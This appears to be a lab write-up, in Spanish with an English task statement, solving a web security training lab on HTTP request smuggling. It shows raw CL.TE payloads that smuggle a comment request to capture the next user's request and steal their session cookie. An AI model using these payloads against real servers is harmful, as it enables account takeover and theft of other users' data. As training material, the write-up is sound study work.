# Exploiting HTTP request smuggling to capture other users' requests
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account.

Primero procedemos a testear si es posibile utilizar nuestras dos cabeceras preferidas:
~~~
POST / HTTP/1.1
Host: Portsqiger-lab
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X
~~~
El time out significa que es CL.TE, el front-end está priorizando el content-length y el backend da un time out porque nunca recibe un 0 que indique que la solicitud terminó.
La primera request dió 200, la segunda me dió 404, lo cual no era lo que estperaba, ya que creía que había un panel admin, pero de todas maneras confirma que es vulnerable
~~~
POST / HTTP/1.1
Host: 0afa00f403658df58014c11e00550063.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 98
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Content-Length: 3
Content-Type: application/x-www-form-urlencoded

x=
~~~
Hay que explotar la parte de enviar comentario, por lo que la concateno a la pestaña de HTTP SMUGGLING, y todo parece marchar correctamente
```
POST / HTTP/1.1
Host: 0afa00f403658df58014c11e00550063.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 358
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: 0afa00f403658df58014c11e00550063.web-security-academy.net
Cookie: session=OqKTGdgxEMBuvPzH5P7C51DewTxRSjr9
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

csrf=tDGVNIcATnxBgEihKNKOCOCsDpoKI2Vq&postId=7&name=qwtre&email=qwerw%40gmail.com&website=http%3A%2F%2Fyeg6wpk2ywy45wjx5i0go9oii9o0ct0i.oastify.com&comment=sd
```
Me aseguro de tener el coment al final, Porque? porque volveremos a recurrir a lo mismo, la request se concatenará, con suerte al admin, y "pescaremos" su solicitud.
Así que seleccionames una solituc normal para saber cuantos bytes son, 707 y lo incluimos en el content length de nuestra solicitud para "pescarla", 827.
```
POST / HTTP/1.1
Host: 0afa00f403658df58014c11e00550063.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 358
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: 0afa00f403658df58014c11e00550063.web-security-academy.net
Cookie: session=OqKTGdgxEMBuvPzH5P7C51DewTxRSjr9
Content-Type: application/x-www-form-urlencoded
Content-Length: 827

csrf=tDGVNIcATnxBgEihKNKOCOCsDpoKI2Vq&postId=7&name=qwtre&email=qwerw%40gmail.com&website=http%3A%2F%2Fyeg6wpk2ywy45wjx5i0go9oii9o0ct0i.oastify.com&comment=sd
```
De esta manera la pestaña apodada "resend" tiene que tener masomenos 827 bytes para que se concatene e iremos creando comentarios. La respuesta de los comentarios en un 302 not modified, asi que enviaremos hasta obtener una respuesta de 200, lo cual significa que la request de alguien más fue capturada. Como todas las respuestas son escritas en un post, tenemos que buscar en dichos comentarios el header "Cookie: ", si vemos la request cortada es porque la request es más larga de lo estimado, así que debemos cambiar el content length de la pestaña de ataque hasta que la incluya. Si incluimos esta cookie en la parte de "storage" dentro del inspector el laboratorio se dará por resuelto
